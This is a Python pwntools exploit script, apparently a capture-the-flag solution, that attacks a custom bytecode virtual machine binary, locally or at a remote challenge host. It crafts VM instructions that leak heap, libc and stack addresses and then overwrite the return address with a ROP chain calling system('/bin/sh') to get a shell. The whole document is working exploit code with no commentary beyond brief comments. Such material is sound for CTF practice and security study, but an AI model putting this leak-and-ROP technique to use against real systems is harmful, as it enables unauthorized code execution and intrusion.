#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./vm_chall_patched"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "uninitialized_vm.eng.run" 
  PORT = 8596
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc  

def Dec_PC(data):
  return b"1"+chr(data).encode()

def Store_Mem(reg):
  return b"2"+str(reg).encode()

def Store_Reg(reg):
  return b"3"+str(reg).encode()

def Copy_Reg(reg1, reg2):
  return b"4"+str(reg1).encode()+str(reg2).encode()

def Set_Reg(reg, data):
  return b"5"+str(reg).encode()+p64(data)

def Memcpy(reg1, reg2, size):
  return b"6"+str(reg1).encode()+str(reg2).encode()+chr(size).encode()

def Plus_Reg(reg1, reg2):
  return b"C"+str(reg1).encode()+str(reg2).encode()

def Minus_Reg(reg1, reg2):
  return b"D"+str(reg1).encode()+str(reg2).encode()

# expand
s.sendlineafter(b" >> ", b"1")
s.sendlineafter(b" >>", b"0")
s.sendlineafter(b" >> ", b"1")
s.sendlineafter(b" >>", b"0")

# set R6 = heap address and R7 = libc address
bc  = Set_Reg(0, 0xff)
bc += Set_Reg(1, 0xe5)
bc += Dec_PC(0)*22
bc += Memcpy(1, 0, 0x80)
bc += Store_Reg(6)
bc += Store_Reg(7)*10
# get libc base
bc += Set_Reg(0, 0x1e6b20)
bc += Minus_Reg(7, 0)
bc += Copy_Reg(2, 7)
# set environ address
bc += Set_Reg(0, 0x1ede28-8)
bc += Plus_Reg(2, 0)
bc += Set_Reg(3, 0x7fffffffffff)
bc += Store_Reg(4)*8
bc += Set_Reg(0, 0x82f)
bc += Set_Reg(4, 0x61)
bc += Minus_Reg(6, 0)
bc += Store_Mem(3)
bc += Store_Mem(2)
bc += Store_Mem(6)
bc += Store_Mem(4)
bc += Set_Reg(0, 0xff)
bc += Set_Reg(1, 0xf7)
bc += Memcpy(0, 1, 0x31)
# Set R5 = stack address
bc += Store_Reg(5)
bc += b"00"
s.sendlineafter(b" >> ", str(len(bc)).encode())
s.sendlineafter(b" >>", bc)

s.sendlineafter(b" >> ", b"1")
s.sendlineafter(b" >>", b"0")

# Repair Counter #0, #1
bc  = Set_Reg(0, 0xff)
bc += Set_Reg(1, 0xe5)
bc += Memcpy(0, 1, 0x29)

# Set Counter #0 = return address in stack
bc += b"0"*(0x45-len(bc))
bc += Store_Reg(0)*18
bc += Set_Reg(0, 0x118)
bc += Minus_Reg(5, 0)   # get return address - 0x18
bc += Store_Mem(5)
bc += Set_Reg(0, 0x2a)
bc += Minus_Reg(6, 0)  
bc += Store_Mem(6)
bc += Set_Reg(0, 0xff)
bc += Set_Reg(1, 0xf7)
bc += Memcpy(0, 1, 0x31)

pop_rdi_ret = 0x10194a #: pop rdi ; ret
system_addr = libc.sym.system
binsh_addr  = next(libc.search(b'/bin/sh'))

# Write ROP system("/binsh") in stack
bc += Set_Reg(0, system_addr)
bc += Copy_Reg(1, 7)
bc += Plus_Reg(1, 0)
bc += Store_Mem(1)
bc += Set_Reg(0, binsh_addr)
bc += Copy_Reg(1, 7)
bc += Plus_Reg(1, 0)
bc += Store_Mem(1)
bc += Set_Reg(0, pop_rdi_ret)
bc += Copy_Reg(1, 7)
bc += Plus_Reg(1, 0)
bc += Store_Mem(1)
bc += Set_Reg(0, pop_rdi_ret+1)
bc += Copy_Reg(1, 7)
bc += Plus_Reg(1, 0)
bc += Store_Mem(1)
s.sendlineafter(b" >> ", str(len(bc)).encode())
s.sendlineafter(b" >>", bc)

s.interactive()   
